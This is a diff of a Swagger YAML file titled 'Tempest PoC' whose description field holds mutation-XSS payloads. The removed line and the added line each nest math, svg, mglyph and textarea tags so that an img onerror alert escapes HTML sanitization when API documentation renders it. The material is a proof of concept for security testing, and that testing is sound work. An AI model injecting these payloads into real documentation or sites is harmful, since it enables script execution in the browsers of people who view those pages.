@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Tempest PoC
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Tempest-XSS') src=1>"></form>
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
 
   version: production
 basePath: /JSSResource/
